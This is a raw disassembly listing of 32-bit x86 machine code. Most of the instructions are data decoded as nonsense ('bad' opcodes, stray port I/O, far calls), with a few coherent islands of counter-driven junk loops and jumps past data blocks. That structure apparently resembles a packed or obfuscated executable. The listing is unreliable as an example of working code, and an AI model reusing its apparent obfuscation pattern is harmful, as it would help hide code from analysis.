  411f5b:	lea    ebx,[ebp-0x40]
  411f5e:	pop    es
  411f5f:	out    dx,al
  411f60:	mov    esi,0xf243a5f2
  411f65:	imul   ebp,DWORD PTR [ebx],0xacccd4ad
  411f6b:	retf   0x632d
  411f6e:	sahf   
  411f6f:	dec    esi
  411f70:	push   esp
  411f71:	bound  edx,QWORD PTR [ebp+0x7f9a434d]
  411f77:	gs xor al,0xc0
  411f7a:	and    al,BYTE PTR ds:0x171ba3c7
  411f80:	in     al,dx
  411f81:	adc    esi,0x547b7e98
  411f87:	and    BYTE PTR [ecx+eax*2+0x4a6742c9],0x4d
  411f8f:	jne    0x411f54
  411f91:	add    eax,ebx
  411f93:	test   eax,0x9a71d4c2
  411f98:	cld    
  411f99:	nop
  411f9a:	aaa    
  411f9b:	jg     0x411f8e
  411f9d:	dec    edi
  411f9e:	ret    0x825a
  411fa1:	shl    DWORD PTR [ebx-0xb],0xf1
  411fa5:	jmp    0x411f8a
  411fa7:	xchg   ecx,eax
  411fa8:	test   eax,0xdd5e47dc
  411fad:	mov    al,ds:0xd68b0f8c
  411fb2:	stos   DWORD PTR es:[edi],eax
  411fb3:	test   DWORD PTR [bx+di],ebx
  411fb6:	hlt    
  411fb7:	mov    ebp,0x2495fd0a
  411fbc:	es sub ebx,edi
  411fbf:	push   esp
  411fc0:	dec    edi
  411fc1:	and    dl,BYTE PTR [edi-0x5f]
  411fc4:	aad    0x71
  411fc6:	mov    al,ds:0x63e9378d
  411fcb:	mov    eax,0xf7f4fdcc
  411fd0:	fucomi st,st(5)
  411fd2:	clc    
  411fd3:	test   al,0xc2
  411fd5:	sub    eax,0x402d37b5
  411fda:	mov    ds:0x95b1d2fb,eax
  411fdf:	mov    edi,0x9edc0fa5
  411fe4:	mov    dl,0xd9
  411fe6:	xor    eax,ebx
  411fe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fe9:	(bad)  
  411feb:	pushf  
  411fec:	mov    edi,0x11364e0a
  411ff1:	sti    
  411ff2:	add    DWORD PTR [ebx-0x5b8c1a75],esi
  411ff8:	popa   
  411ff9:	or     DWORD PTR fs:[ebp-0x6a],ebp
  411ffd:	icebp  
  411ffe:	lock std 
  412000:	push   eax
  412001:	sbb    eax,0xc19eaac5
  412006:	into   
  412007:	in     eax,0x63
  412009:	icebp  
  41200a:	push   ecx
  41200b:	adc    eax,0xfe60b542
  412010:	mov    edx,0xc606a45c
  412015:	cwde   
  412016:	fs mov edx,0xee84729b
  41201c:	(bad)  
  41201d:	dec    ebp
  41201e:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  412020:	sahf   
  412021:	add    al,0x4d
  412023:	xor    edi,ecx
  412025:	lea    edx,[edx+0x78]
  412028:	adc    al,0x98
  41202a:	test   BYTE PTR [edi-0x4850cd12],0x96
  412031:	scas   eax,DWORD PTR es:[edi]
  412032:	or     al,BYTE PTR [ebx-0x439414c5]
  412038:	sub    BYTE PTR [edi-0x108994dd],bh
  41203e:	cmc    
  41203f:	pop    ebx
  412040:	jne    0x411ffd
  412042:	call   FWORD PTR [ecx]
  412044:	rol    edx,cl
  412046:	xor    ecx,ebx
  412048:	fiadd  WORD PTR [ebx+0x3d]
  41204b:	pop    ebp
  41204c:	mov    ebx,0xd54a01
  412051:	ja     0x411fdb
  412053:	dec    edi
  412054:	add    edx,DWORD PTR [esi+eax*8]
  412057:	test   bl,ah
  412059:	pop    ebx
  41205a:	lods   al,BYTE PTR ds:[esi]
  41205b:	into   
  41205c:	or     BYTE PTR [eax],ah
  41205e:	fadd   DWORD PTR [esi]
  412060:	push   esp
  412061:	mov    cl,0x26
  412063:	imul   ebx,DWORD PTR [edi+0x32],0x53
  412067:	add    esp,DWORD PTR [ecx+0x69e1146f]
  41206d:	lds    esp,FWORD PTR [edi]
  41206f:	cmp    DWORD PTR [ebp+0xc],eax
  412072:	std    
  412073:	push   ecx
  412074:	pop    ss
  412075:	adc    eax,0x29123cec
  41207a:	rcr    DWORD PTR [ecx-0x8ad9d1],cl
  412080:	aad    0x8a
  412082:	ja     0x412042
  412084:	or     al,0x16
  412086:	xor    eax,0x81656fae
  41208b:	not    BYTE PTR [ebp+0x32]
  41208e:	push   edx
  41208f:	mov    eax,0x8504c8c4
  412094:	or     dh,BYTE PTR [esp+edx*1-0x3a402fb4]
  41209b:	jnp    0x412057
  41209d:	and    al,0xc2
  41209f:	push   esp
  4120a0:	pushf  
  4120a1:	sub    ecx,ebx
  4120a3:	scas   al,BYTE PTR es:[edi]
  4120a4:	mov    esp,0x40f06dc7
  4120a9:	mov    eax,DWORD PTR [ebp+0x8]
  4120ac:	mov    eax,DWORD PTR [eax]
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fe76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fdd5
  4120d3:	adc    DWORD PTR ds:0x42e7ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e7eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e803,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e7fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e7fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e7fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fe7e
  412121:	push   0x0
  412123:	push   0x42e36d
  412128:	call   DWORD PTR ds:0x42e583
  41212e:	mov    ebx,DWORD PTR ds:0x42e7fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e7fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e220,0x42fe01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	inc    ecx
  41216e:	push   esi
  41216f:	adc    ebp,ecx
  412171:	inc    esi
  412172:	pop    edi
  412173:	jo     0x4121e5
  412175:	mov    ecx,0xe870707e
  41217a:	mov    BYTE PTR [ebx+0x3ce34146],al
  412180:	push   ebp
  412181:	inc    ebp
  412182:	popa   
  412183:	fidiv  WORD PTR [edi]
  412185:	xlat   BYTE PTR ds:[ebx]
  412186:	popa   
  412187:	dec    eax
  412188:	pop    edx
  412189:	shl    BYTE PTR [esp+edi*8-0x7e],0xc5
  41218e:	xor    ebx,DWORD PTR [ebp+0x42]
  412191:	(bad)  
  412192:	lods   eax,DWORD PTR ds:[esi]
  412193:	pusha  
  412194:	xchg   edi,eax
  412195:	retf   
  412196:	adc    DWORD PTR [ecx+0x26b00a00],eax
  41219c:	dec    ecx
  41219d:	jo     0x4121d0
  41219f:	loopne 0x4121c1
  4121a1:	adc    BYTE PTR [edx+0xfebb1b8],0x57
  4121a8:	sbb    edx,DWORD PTR ds:0xe3f9b1fe
  4121ae:	int    0xa1
  4121b0:	add    BYTE PTR [edx+0x61],bh
  4121b3:	push   edx
  4121b4:	mov    eax,0xbf4f2cd1
  4121b9:	dec    esp
  4121ba:	in     al,dx
  4121bb:	or     al,0x83
  4121bd:	int3   
  4121be:	hlt    
  4121bf:	jecxz  0x412230
  4121c1:	stos   BYTE PTR es:[edi],al
  4121c2:	lds    ebp,FWORD PTR [ecx+0x5f6b77a3]
  4121c8:	lds    ecx,FWORD PTR [edx-0x23]
  4121cb:	push   esp
  4121cc:	push   eax
  4121cd:	cmp    al,0x1e
  4121cf:	ins    DWORD PTR es:[edi],dx
  4121d0:	loop   0x412159
  4121d2:	ss mov bh,0x3d
  4121d5:	call   0xc5ef41a4
  4121da:	pop    ebp
  4121db:	lock add ah,ch
  4121de:	addr16 mov edx,0x2fd0fcb5
  4121e4:	fwait
  4121e5:	jge    0x412222
  4121e7:	fisttp DWORD PTR [ebx*8+0x7b1c8f32]
  4121ee:	stc    
  4121ef:	int    0xb6
  4121f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121f2:	pop    esp
  4121f3:	(bad)  
  4121f4:	sub    DWORD PTR [edi+0x6],edx
  4121f7:	push   eax
  4121f8:	sbb    BYTE PTR [edi],dh
  4121fa:	dec    ebp
  4121fb:	inc    ecx
  4121fc:	mov    ch,0x22
  4121fe:	xchg   DWORD PTR [ecx-0x50],edi
  412201:	xchg   ebp,eax
  412202:	mov    WORD PTR [ebx-0x2068b489],fs
  412208:	cmp    ch,BYTE PTR [edi+edi*8-0x4a]
  41220c:	or     BYTE PTR [edi],0xf3
  41220f:	inc    edi
  412210:	jmp    DWORD PTR [esi+eiz*1]
  412213:	out    dx,eax
  412214:	sbb    ah,BYTE PTR [esi]
  412216:	out    dx,al
  412217:	inc    edi
  412218:	jge    0x412297
  41221a:	(bad)  
  41221b:	shl    BYTE PTR [edx],cl
  41221d:	adc    BYTE PTR [edi],ch
  41221f:	cli    
  412220:	daa    
  412221:	dec    eax
  412222:	mov    dh,dh
  412224:	test   BYTE PTR [edx-0x55b4e932],bh
  41222a:	int3   
  41222b:	retf   0xab64
  41222e:	stos   DWORD PTR es:[edi],eax
  41222f:	shl    al,1
  412231:	mov    edx,0xede6934b
  412236:	outs   dx,BYTE PTR cs:[esi]
  412238:	and    BYTE PTR [edi+0x4e],bh
  41223b:	stos   BYTE PTR es:[edi],al
  41223c:	pop    ss
  41223d:	or     eax,0xbed7e4b0
  412242:	cld    
  412243:	inc    ebx
  412244:	or     eax,0x640ed47f
  412249:	inc    esp
  41224a:	pop    esi
  41224b:	add    DWORD PTR [esp+esi*1],ebp
  41224e:	sub    al,0xac
  412250:	or     edx,DWORD PTR gs:[ecx-0x67]
  412254:	lock mov al,ds:0xf404c21d
  41225a:	ret    0xa152
  41225d:	call   0x5da9:0xab9e929d
  412264:	mov    cl,0x8c
  412266:	cli    
  412267:	bound  ebx,QWORD PTR [ebp+0x6ae0b2df]
  41226d:	jns    0x41222a
  41226f:	ss iret 
  412271:	imul   ecx,DWORD PTR [esi+eax*1+0x2782f423],0x7b
  412279:	add    al,0xac
  41227b:	pop    ss
  41227c:	inc    edi
  41227d:	mov    ch,cl
  41227f:	pop    eax
  412280:	loope  0x41226b
  412282:	inc    ecx
  412283:	scas   eax,DWORD PTR es:[edi]
  412284:	add    DWORD PTR [eax+0x1a863aab],edx
  41228a:	rcr    DWORD PTR [eax-0x36],1
  41228d:	jno    0x4122f5
  41228f:	aad    0x3d
  412291:	les    esi,FWORD PTR [ecx]
  412293:	jl     0x412305
  412295:	sub    eax,0x62c06311
  41229a:	stos   BYTE PTR es:[edi],al
  41229b:	mov    BYTE PTR ds:0x90e02b80,bl
  4122a1:	fld    QWORD PTR [ebx-0x6fd23377]
  4122a7:	mov    bl,0xaf
  4122a9:	call   0xe67a:0x2f16d9ef
  4122b0:	out    dx,eax
  4122b1:	mov    eax,ds:0x30bf7ca0
  4122b6:	mov    ah,0x84
  4122b8:	pop    ds
  4122b9:	ins    DWORD PTR es:[edi],dx
  4122ba:	and    ecx,ebx
  4122bc:	sar    DWORD PTR [ebx+0x1],1
  4122bf:	imul   esi,DWORD PTR [edi+0x65],0x443f49dd
  4122c6:	sub    al,0x5f
  4122c8:	xor    al,0x0
  4122ca:	or     al,0x13
  4122cc:	aam    0x4f
  4122ce:	retf   0x7311
  4122d1:	jecxz  0x412341
  4122d3:	cmp    eax,0xe0393b38
  4122d8:	outs   dx,DWORD PTR ds:[esi]
  4122d9:	dec    ebx
  4122da:	in     al,dx
  4122db:	aas    
  4122dc:	mov    ebx,0x67733580
  4122e1:	fidiv  DWORD PTR [eax]
  4122e3:	mov    DWORD PTR [esi-0x3],edx
  4122e6:	(bad)
  4122e9:	adc    al,0x55
  4122eb:	xchg   edi,eax
  4122ec:	adc    edx,DWORD PTR [edx]
  4122ee:	mov    bl,0x3b
  4122f0:	fnstenv [ebx]
  4122f2:	into   
  4122f3:	leave  
  4122f4:	or     al,0x66
  4122f6:	xor    edx,ecx
  4122f8:	mov    ds:0x53e81d14,eax
  4122fd:	dec    ecx
  4122fe:	mov    dl,ch
  412300:	ins    DWORD PTR es:[edi],dx
  412301:	iret   
  412302:	mov    dh,0xf6
  412304:	and    al,0xda
  412306:	retf   
  412307:	out    dx,al
  412308:	sub    ecx,esi
  41230a:	push   esi
  41230b:	and    BYTE PTR [ecx+edx*1],0xe
  41230f:	mov    eax,0x42e42c45
  412314:	mov    ah,0xd2
  412316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412317:	dec    edx
  412318:	push   ebp
  412319:	les    esi,FWORD PTR [edx+0x788fc52]
  41231f:	popa   
  412320:	fld    TBYTE PTR [eax+0x4be4734e]
  412326:	adc    DWORD PTR [eax+ecx*4],0x969785ee
  41232d:	pop    esp
  41232e:	addr16 mov edi,ss
  412331:	adc    eax,0xa256d52f
  412336:	nop
  412337:	xor    eax,0x2ca6b3a8
  41233c:	sbb    dl,cl
  41233e:	mov    eax,ds:0xec8c6cd6
  412343:	inc    esp
  412344:	sub    al,0xf2
  412346:	cmp    al,0x96
  412348:	sbb    cl,BYTE PTR [edx+eax*8-0x67223371]
  41234f:	xor    esi,ebx
  412351:	(bad)  
  412352:	shl    ebp,cl
  412354:	call   0x4742:0x86168675
  41235b:	shl    ah,cl
  41235d:	dec    edx
  41235e:	pop    edi
  41235f:	aam    0x2e
  412361:	fdivr  QWORD PTR [eax+0x55]
  412364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412365:	sbb    ecx,DWORD PTR [edx+0x5d2fca7]
  41236b:	adc    dl,BYTE PTR [eax+0x46]
  41236e:	sub    BYTE PTR [edi-0x28],bl
  412371:	push   esi
  412372:	loop   0x412318
  412374:	js     0x412306
  412376:	or     al,cl
  412378:	and    edi,eax
  41237a:	push   eax
  41237b:	clc    
  41237c:	mov    ebx,0xce826994
  412381:	xor    BYTE PTR [ecx],ch
  412383:	add    DWORD PTR [edi+eiz*1-0xb76bd7a],0x7ce9b66a
  41238e:	cwde   
  41238f:	add    BYTE PTR [ecx+0x64a50e10],0x23
  412396:	add    edi,DWORD PTR [edi-0x7d]
  412399:	mov    esp,0x795bac93
  41239e:	xor    ch,al
  4123a0:	jecxz  0x412353
  4123a2:	inc    ebx
  4123a3:	repnz push 0x591a2f7c
  4123a9:	adc    eax,0x9e97b9a8
  4123ae:	cmp    al,0xe0
  4123b0:	add    eax,DWORD PTR [edx-0x4f185aab]
  4123b6:	push   es
  4123b7:	xchg   esi,eax
  4123b8:	dec    ecx
  4123b9:	ins    DWORD PTR es:[edi],dx
  4123ba:	shl    BYTE PTR [eax-0x76],0x30
  4123be:	push   edx
  4123bf:	(bad)  
  4123c0:	or     cl,al
  4123c2:	clc    
  4123c3:	je     0x412429
  4123c5:	sub    ebx,ecx
  4123c7:	inc    edi
  4123c8:	imul   esi,DWORD PTR [ebp-0x2b9b0b39],0xdf1ffa84
  4123d2:	and    ebp,DWORD PTR [edi+0x6c6d1094]
  4123d8:	dec    esp
  4123d9:	push   ds
  4123da:	mov    DWORD PTR [ecx+eiz*2-0x7db390e0],ebp
  4123e1:	fbstp  TBYTE PTR ds:0x46e6ca8f
  4123e7:	pushf  
  4123e8:	dec    edi
  4123e9:	add    al,0xe9
  4123eb:	(bad)  
  4123ec:	mov    eax,0x95be588c
  4123f1:	sbb    edi,DWORD PTR [ebp-0x558aa908]
  4123f7:	sub    al,0xd7
  4123f9:	push   ebx
  4123fa:	mov    DWORD PTR [ebx],esp
  4123fc:	fwait
  4123fd:	and    al,bl
  4123ff:	imul   ebx,esp,0x7d83bc8d
  412405:	jecxz  0x412419
  412407:	adc    al,0x7c
  412409:	rol    BYTE PTR [edx+0x37],1
  41240c:	test   DWORD PTR [ecx+0x5c2c7396],0x6b30f65f
  412416:	dec    ebp
  412417:	xchg   ebp,eax
  412418:	push   ss
  412419:	sub    esi,edx
  41241b:	inc    eax
  41241c:	data16 and BYTE PTR ds:[esi+0x4],cl
  412421:	xor    al,0x95
  412423:	fld    QWORD PTR [esi]
  412425:	add    DWORD PTR es:[eax],esp
  412428:	sbb    edi,DWORD PTR [edx-0x7]
  41242b:	dec    eax
  41242c:	cmp    BYTE PTR [esi+0x21],dl
  41242f:	addr16 inc ebp
  412431:	(bad)  
  412433:	adc    eax,ebp
  412435:	fcmove st,st(7)
  412437:	in     eax,dx
  412438:	in     eax,dx
  412439:	mov    ebx,0xc3ce25a1
  41243e:	xor    al,0x79
  412440:	add    ecx,ebx
  412442:	sub    DWORD PTR ds:0x42fdf9,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	jmp    0x705c:0x8f6026b2
  412464:	jo     0x41241f
  412466:	jle    0x4124d8
  412468:	jo     0x412480
  41246a:	aaa    
  41246b:	xchg   esi,eax
  41246c:	pop    ds
  41246d:	out    0x70,eax
  41246f:	ficomp DWORD PTR [ebp-0x39ba3c27]
  412475:	test   esp,0x88ad68a6
  41247b:	jbe    0x4124e3
  41247d:	jl     0x41241e
  41247f:	mov    eax,ds:0x3bb538bd
  412484:	or     cl,al
  412486:	push   0x81334a1d
  41248b:	addr16 fsubr st,st(7)
  41248e:	aam    0xaa
  412490:	adc    BYTE PTR [ebp+0x2e],ah
  412493:	jae    0x412422
  412495:	test   DWORD PTR [edi-0x60d5bcdb],ebx
  41249b:	mov    al,ds:0x8def6ca4
  4124a0:	icebp  
  4124a1:	xchg   BYTE PTR [eax-0x7f],ch
  4124a4:	cmc    
  4124a5:	sbb    eax,0x62f2523d
  4124aa:	retf   0x54f7
  4124ad:	sub    ebx,DWORD PTR [ebp-0x5759b7f8]
  4124b3:	lahf   
  4124b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124b5:	pop    esi
  4124b6:	sar    DWORD PTR [ebx],0x96
  4124b9:	das    
  4124ba:	add    al,0x6a
  4124bc:	fmulp  st(7),st
  4124be:	aas    
  4124bf:	jbe    0x412499
  4124c1:	dec    edi
  4124c2:	in     al,dx
  4124c3:	sbb    BYTE PTR [eax-0x46],bl
  4124c6:	and    DWORD PTR [ecx+0x311d28ca],ecx
  4124cc:	mov    ch,0x9a
  4124ce:	inc    esi
  4124cf:	mov    dl,0xde
  4124d1:	cmp    DWORD PTR [esi],esp
  4124d3:	shr    dl,0xf4
  4124d6:	ret    0xdd2c
  4124d9:	std    
  4124da:	int    0xbf
  4124dc:	jmp    0x412533
  4124de:	mov    ah,0xa8
  4124e0:	stc    
  4124e1:	mov    dh,0x9f
  4124e3:	push   es
  4124e4:	inc    edx
  4124e5:	xor    al,0x50
  4124e7:	(bad)  
  4124e8:	sahf   
  4124e9:	into   
  4124ea:	lock stos BYTE PTR es:[edi],al
  4124ec:	pop    es
  4124ed:	or     al,0x1a
  4124ef:	add    eax,0x7a0cdf8f
  4124f4:	mov    cl,0x94
  4124f6:	fwait
  4124f7:	cwde   
  4124f8:	pop    es
  4124f9:	cdq    
  4124fa:	popa   
  4124fb:	js     0x4124ac
  4124fd:	mov    sp,0xd685
  412501:	add    ch,BYTE PTR fs:[eax-0x2]
  412505:	mov    ebp,0xe5c9e8e9
  41250a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41250b:	sar    DWORD PTR [edi+0x51],1
  41250e:	pop    ss
  41250f:	shl    BYTE PTR [ebx],cl
  412511:	xor    BYTE PTR [ebx+0x24482e52],al
  412517:	retf   
  412518:	addr16 sti 
  41251a:	push   esp
  41251b:	sahf   
  41251c:	mov    ecx,0xad56a0f5
  412521:	sbb    cl,dl
  412523:	adc    esi,DWORD PTR [ecx+0x48]
  412526:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412527:	sbb    BYTE PTR [edi+0xc],ah
  41252a:	jge    0x412541
  41252c:	popf   
  41252d:	dec    edi
  41252e:	mov    eax,ds:0x205103f4
  412533:	bound  esi,QWORD PTR [edx-0x52ecdaa4]
  412539:	sub    eax,0x38c25ad6
  41253e:	jg     0x4124ed
  412540:	in     al,0xd0
  412542:	adc    DWORD PTR [esi-0x1e97646d],eax
  412548:	mov    ah,0xa8
  41254a:	xor    ecx,DWORD PTR [edi-0x26]
  41254d:	sbb    DWORD PTR [esi-0x384b58a4],esp
  412553:	cmp    DWORD PTR [edx-0x2e],edx
  412556:	dec    edx
  412557:	icebp  
  412558:	pop    ebx
  412559:	es out dx,al
  41255b:	add    BYTE PTR [ebp+0x20add5f5],dl
  412561:	push   ss
  412562:	sbb    esp,DWORD PTR [eax]
  412564:	imul   ebx,DWORD PTR [eax],0x20
  412567:	pop    es
  412568:	inc    ecx
  412569:	push   esp
  41256a:	adc    al,0x26
  41256c:	outs   dx,DWORD PTR ds:[esi]
  41256d:	add    eax,ebp
  41256f:	shr    eax,0xe0
  412572:	data16 fnstsw WORD PTR [ebp-0x64ae70e3]
  412579:	(bad)  
  41257a:	fs mov dl,0xe3
  41257d:	jnp    0x4125ab
  41257f:	call   0xe363:0x680b5656
  412586:	pushf  
  412587:	or     eax,0x7debc9af
  41258c:	xchg   BYTE PTR [eax],bh
  41258e:	mov    bl,0xf1
  412590:	fidiv  DWORD PTR [esi-0x64c72327]
  412596:	mov    BYTE PTR [ebx],ch
  412598:	std    
  412599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41259a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41259b:	jle    0x41252c
  41259d:	push   ebx
  41259e:	aad    0xda
  4125a0:	mov    BYTE PTR [esi+esi*4+0x3f],dh
  4125a4:	pop    esp
  4125a5:	mov    al,0xe4
  4125a7:	les    esi,FWORD PTR cs:[ecx+0x2d23d3ca]
  4125ae:	ret    0x1ac0
  4125b1:	repnz (bad) 
  4125b3:	cmc    
  4125b4:	imul   ecx,edx,0x70
  4125b7:	push   eax
  4125b8:	rol    BYTE PTR [ecx],0x71
  4125bb:	lds    ebp,FWORD PTR ds:[esi-0x47]
  4125bf:	mov    ebx,0x505fab46
  4125c4:	dec    edi
  4125c5:	enter  0x5330,0xfa
  4125c9:	xchg   ecx,eax
  4125ca:	add    dh,al
  4125cc:	imul   ax,WORD PTR [edx+0x23b11171],0x11
  4125d4:	mov    ss,sp
  4125d7:	retf   
  4125d8:	fcomp  DWORD PTR [ecx-0x9db4d32]
  4125de:	add    bh,BYTE PTR [esi+esi*8+0x795d1f5]
  4125e5:	mov    al,0x1f
  4125e7:	gs loopne 0x41258f
  4125ea:	inc    edi
  4125eb:	and    BYTE PTR [esi+0x41f6278e],ch
  4125f1:	add    BYTE PTR [edi-0x43cad51f],dh
  4125f7:	iret   
  4125f8:	or     BYTE PTR [ebx+0xc269c0],bh
  4125fe:	jg     0x412643
  412600:	imul   esp,DWORD PTR [edx+0x54],0xfffffffd
  412604:	stos   BYTE PTR es:[edi],al
  412605:	lahf   
  412606:	ds stos BYTE PTR es:[edi],al
  412608:	cmp    ecx,ebx
  41260a:	pop    ecx
  41260b:	add    DWORD PTR [ecx-0x54484478],ebp
  412611:	dec    esi
  412612:	pop    edi
  412613:	mul    BYTE PTR [eax+ecx*1+0x19]
  412617:	xor    DWORD PTR [eax+edi*1+0x6ed34c82],edi
  41261e:	or     DWORD PTR [edx-0x3c],esp
  412621:	jae    0x4125b5
  412623:	pusha  
  412624:	mov    dl,BYTE PTR [edx-0x30b55eeb]
  41262a:	ret    
  41262b:	(bad)  
  41262c:	fst    DWORD PTR [ecx-0x7fe393e0]
  412632:	(bad)  
  412633:	loopne 0x41269d
  412635:	ja     0x4125ef
  412637:	cs lock and al,0x1
  41263b:	xor    al,0xfb
  41263d:	sub    DWORD PTR [esi-0x3b145b36],ebx
  412643:	call   0x94b291bc
  412648:	popa   
  412649:	and    DWORD PTR [edi-0x7a0fff6d],esi
  41264f:	push   cs
  412650:	loopne 0x41268c
  412652:	sub    ah,ch
  412654:	push   ecx
  412655:	sahf   
  412656:	xchg   ebp,eax
  412657:	push   ss
  412658:	jne    0x412647
  41265a:	cmp    BYTE PTR [ebx-0x2],al
  41265d:	popf   
  41265e:	(bad)  
  412660:	clc    
  412661:	xchg   edx,eax
  412662:	data16 loope 0x412683
  412665:	push   esp
  412666:	and    cl,BYTE PTR [eax-0x3ac03234]
  41266c:	push   esi
  41266d:	and    al,0x3d
  41266f:	dec    ebx
  412670:	dec    esi
  412671:	popf   
  412672:	mov    ds:0x911450d9,al
  412677:	sbb    bl,0xef
  41267a:	inc    edi
  41267b:	sar    BYTE PTR [eax],0xae
  41267e:	gs xchg esp,eax
  412680:	into   
  412681:	cs or  al,0xc7
  412684:	outs   dx,BYTE PTR ds:[esi]
  412685:	(bad)  
  412686:	pop    ebp
  412687:	rcr    DWORD PTR [ebx],1
  412689:	mov    esp,0xb06136ab
  41268e:	gs mov edi,esi
  412691:	int    0x13
  412693:	xchg   edx,eax
  412694:	push   cs
  412695:	cmp    esi,DWORD PTR [edi-0x4f]
  412698:	jno    0x4126cb
  41269a:	ror    DWORD PTR [ebp+0x7a],0x7a
  41269e:	dec    ecx
  41269f:	jmp    0xc402:0x2cae62eb
  4126a6:	xor    eax,0xb31dfd50
  4126ab:	mov    esp,0x1b6ceffa
  4126b0:	lahf   
  4126b1:	mov    ebx,0x29635164
  4126b6:	jl     0x412648
  4126b8:	and    bh,ch
  4126ba:	lahf   
  4126bb:	push   0x390eff79
  4126c0:	mov    WORD PTR [edx+0x21],ds
  4126c3:	add    BYTE PTR [ebx],dl
  4126c5:	sbb    bl,ah
  4126c7:	or     al,0x72
  4126c9:	adc    edi,DWORD PTR [esi-0x40257b30]
  4126cf:	mov    eax,0x9961a17f
  4126d4:	lods   al,BYTE PTR ds:[esi]
  4126d5:	and    edx,DWORD PTR [edx-0x41]
  4126d8:	jecxz  0x412674
  4126da:	and    esi,ebx
  4126dc:	add    ch,bh
  4126de:	sub    bl,0x5c
  4126e1:	mov    DWORD PTR [ecx+0x778baf89],edx
  4126e7:	fucomip st,st(2)
  4126e9:	call   0xc72e:0x270e3138
  4126f0:	mov    edx,es
  4126f2:	pop    ds
  4126f3:	push   edx
  4126f4:	loope  0x41269d
  4126f6:	mov    dh,BYTE PTR [ecx+edi*2]
  4126f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126fa:	push   ebx
  4126fb:	mov    edi,0x6aff6c90
  412700:	sar    DWORD PTR [ecx],0xdf
  412703:	jnp    0x4126ba
  412705:	jns    0x4126df
  412707:	(bad)  
  412708:	leave  
  412709:	fcmovu st,st(0)
  41270b:	scas   al,BYTE PTR es:[edi]
  41270c:	cwde   
  41270d:	retf   0xa63a
  412710:	call   0xa18f:0xb5cb61f7
  412717:	and    ebx,edi
  412719:	xor    eax,0x722225ab
  41271e:	mov    bh,0xcb
  412720:	mov    ds,WORD PTR [eax]
  412722:	je     0x412745
  412724:	nop
  412725:	mov    DWORD PTR [ecx-0x47],edi
  412728:	std    
  412729:	dec    edi
  41272a:	stos   BYTE PTR es:[edi],al
  41272b:	or     DWORD PTR [eax+eax*2-0x6d],edx
  41272f:	ret    
  412730:	mov    DWORD PTR [ebp-0x1c],ecx
  412733:	and    DWORD PTR ds:0x42fe76,0x0
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fe76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fe76,ecx
  412751:	cmp    DWORD PTR ds:0x42fe76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fe76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e413
  41277c:	cmp    DWORD PTR ds:0x42fe76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fe76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fe76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fe6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    ebx,eax
  4127be:	xchg   ecx,eax
  4127bf:	popa   
  4127c0:	adc    eax,0x707059c8
  4127c5:	mov    ecx,0xde70707e
  4127ca:	into   
  4127cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127cc:	xor    DWORD PTR [ebp-0x5b436ef5],ecx
  4127d2:	pop    ebx
  4127d3:	push   ebx
  4127d4:	(bad)  
  4127d6:	and    bh,dl
  4127d8:	dec    eax
  4127d9:	inc    ebp
  4127da:	mov    DWORD PTR [edx+0xf],eax
  4127dd:	inc    ebx
  4127de:	out    dx,eax
  4127df:	jns    0x4127cc
  4127e1:	(bad)  
  4127e2:	neg    BYTE PTR [ebx+esi*4]
  4127e5:	daa    
